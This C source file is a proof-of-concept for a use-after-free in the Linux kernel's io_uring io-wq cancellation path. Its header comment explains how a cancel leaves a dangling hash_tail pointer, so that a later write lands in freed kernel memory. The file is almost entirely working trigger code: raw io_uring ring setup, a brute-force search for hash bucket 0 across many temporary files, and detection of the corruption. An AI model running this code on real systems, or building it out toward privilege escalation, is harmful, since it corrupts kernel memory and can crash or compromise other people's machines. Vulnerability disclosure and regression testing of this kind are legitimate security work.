/*
 * iowq_uaf.c
 * io_wq_remove_pending UAF — Linux 6.19.11, fixed in 7.1-rc4 (d6a2d7b04b5a).
 *
 * NW (NOP+IOSQE_ASYNC) + W0 (WRITE, hashed bucket 0) + CANCEL(W0). Cancel
 * walks back to non-hashed NW, matches `flags >> 24 == 0` against W0's
 * hash 0, sets hash_tail[0] = &NW->work. NW completes, slot freed,
 * hash_tail[0] dangling. A second hashed-bucket-0 write writes
 * &H1->work.list into freed_NW + 0xD8.
 *
 * Bucket 0 is found by brute force across many tmpfiles. Detection:
 * the trigger write's CQE never lands because the corrupted list
 * tangled it.
 *
 * gcc -O2 -o iowq_uaf iowq_uaf.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/io_uring.h>

#define NFILES 1024

static int io_uring_setup(unsigned e, struct io_uring_params *p)
{ return syscall(__NR_io_uring_setup, e, p); }
static int io_uring_enter(int fd, unsigned s, unsigned m, unsigned f, void *a, size_t z)
{ return syscall(__NR_io_uring_enter, fd, s, m, f, a, z); }
static int io_uring_register(int fd, unsigned op, void *arg, unsigned n)
{ return syscall(__NR_io_uring_register, fd, op, arg, n); }

struct ring {
    int fd;
    unsigned *sq_head, *sq_tail, *sq_mask, *sq_array;
    unsigned *cq_head, *cq_tail, *cq_mask;
    struct io_uring_sqe *sqes;
    struct io_uring_cqe *cqes;
};

static int ring_init(struct ring *r, unsigned entries)
{
    struct io_uring_params p = {0};
    r->fd = io_uring_setup(entries, &p);
    if (r->fd < 0) return -1;

    size_t sq_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    size_t cq_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);
    void *sq = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    void *cq = mmap(NULL, cq_sz, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_CQ_RING);
    r->sqes = mmap(NULL, p.sq_entries * sizeof(*r->sqes),
                   PROT_READ|PROT_WRITE, MAP_SHARED|MAP_POPULATE,
                   r->fd, IORING_OFF_SQES);
    if (sq == MAP_FAILED || cq == MAP_FAILED || r->sqes == MAP_FAILED) return -1;

    r->sq_head  = sq + p.sq_off.head;
    r->sq_tail  = sq + p.sq_off.tail;
    r->sq_mask  = sq + p.sq_off.ring_mask;
    r->sq_array = sq + p.sq_off.array;
    r->cq_head  = cq + p.cq_off.head;
    r->cq_tail  = cq + p.cq_off.tail;
    r->cq_mask  = cq + p.cq_off.ring_mask;
    r->cqes     = cq + p.cq_off.cqes;
    return 0;
}

static struct io_uring_sqe *sq_get(struct ring *r)
{
    unsigned t = *r->sq_tail;
    struct io_uring_sqe *s = &r->sqes[t & *r->sq_mask];
    memset(s, 0, sizeof(*s));
    r->sq_array[t & *r->sq_mask] = t & *r->sq_mask;
    (*r->sq_tail)++;
    return s;
}

static void wait_n(struct ring *r, int n)
{
    while ((int)(*r->cq_tail - *r->cq_head) < n)
        io_uring_enter(r->fd, 0, n, IORING_ENTER_GETEVENTS, NULL, 0);
}

static int find_cqe(struct ring *r, unsigned long ud, int wait_ms, int *res)
{
    struct timespec d, n;
    clock_gettime(CLOCK_MONOTONIC, &d);
    d.tv_nsec += (long)wait_ms * 1000000;
    while (d.tv_nsec >= 1000000000) { d.tv_sec++; d.tv_nsec -= 1000000000; }

    for (;;) {
        unsigned h = *r->cq_head, t = *r->cq_tail;
        while (h != t) {
            struct io_uring_cqe *c = &r->cqes[h & *r->cq_mask];
            if (c->user_data == ud) {
                *res = c->res;
                *r->cq_head = h + 1;
                return 1;
            }
            h++;
        }
        clock_gettime(CLOCK_MONOTONIC, &n);
        if (n.tv_sec > d.tv_sec ||
            (n.tv_sec == d.tv_sec && n.tv_nsec >= d.tv_nsec))
            return 0;
        struct timespec s = {0, 1000000};
        nanosleep(&s, NULL);
        io_uring_enter(r->fd, 0, 0, 0, NULL, 0);
    }
}

static char paths[NFILES][80];

static void cleanup(void)
{
    for (int i = 0; i < NFILES; i++)
        if (paths[i][0]) unlink(paths[i]);
}

static void on_signal(int s) { (void)s; cleanup(); _exit(1); }

int main(void)
{
    struct ring r;
    char buf[64];
    int created = 0, hit = -1;

    memset(buf, 'A', sizeof buf);
    signal(SIGINT, on_signal);
    signal(SIGTERM, on_signal);
    atexit(cleanup);

    if (ring_init(&r, 256) < 0) { perror("io_uring_setup"); return 1; }

    unsigned cap[2] = {1, 0};
    io_uring_register(r.fd, IORING_REGISTER_IOWQ_MAX_WORKERS, cap, 2);

    for (int i = 0; i < NFILES; i++) {
        snprintf(paths[i], sizeof paths[i], "/tmp/iowq_poc_%04d", i);
        int fd = open(paths[i], O_RDWR|O_CREAT|O_TRUNC, 0600);
        if (fd < 0) { paths[i][0] = 0; if (errno == EMFILE || errno == ENFILE) break; continue; }
        write(fd, buf, sizeof buf);
        close(fd);
        created++;
    }

    for (int i = 0; i < NFILES && hit < 0; i++) {
        if (!paths[i][0]) continue;
        int fd = open(paths[i], O_RDWR);
        if (fd < 0) continue;

        struct io_uring_sqe *s;
        s = sq_get(&r); s->opcode = IORING_OP_NOP;
        s->flags = IOSQE_ASYNC; s->user_data = 0x200;

        s = sq_get(&r); s->opcode = IORING_OP_WRITE;
        s->fd = fd; s->addr = (unsigned long)buf; s->len = 8; s->user_data = 0x300;

        s = sq_get(&r); s->opcode = IORING_OP_ASYNC_CANCEL;
        s->addr = 0x300; s->user_data = 0x400;

        if (io_uring_enter(r.fd, 3, 0, 0, NULL, 0) < 0) { close(fd); continue; }
        wait_n(&r, 3);

        int cancel_res = -1;
        unsigned h = *r.cq_head, t = *r.cq_tail;
        for (unsigned j = h; j != t; j++) {
            struct io_uring_cqe *c = &r.cqes[j & *r.cq_mask];
            if (c->user_data == 0x400) cancel_res = c->res;
        }
        *r.cq_head = t;

        if (cancel_res != 0) { close(fd); continue; }

        usleep(2000);

        s = sq_get(&r); s->opcode = IORING_OP_WRITE;
        s->fd = fd; s->addr = (unsigned long)buf; s->len = 8; s->user_data = 0x500;
        io_uring_enter(r.fd, 1, 0, 0, NULL, 0);

        int h1_res = 0;
        if (!find_cqe(&r, 0x500, 300, &h1_res)) {
            hit = i;
            s = sq_get(&r); s->opcode = IORING_OP_ASYNC_CANCEL;
            s->addr = 0x500; s->user_data = 0x600;
            io_uring_enter(r.fd, 1, 0, 0, NULL, 0);
            usleep(200000);
            *r.cq_head = *r.cq_tail;
        }

        close(fd);
    }

    close(r.fd);
    if (hit < 0) { printf("no bucket-0 hit in %d files\n", created); return 1; }
    printf("trigger fired on %s (idx %d)\n", paths[hit], hit);
    return 0;
}
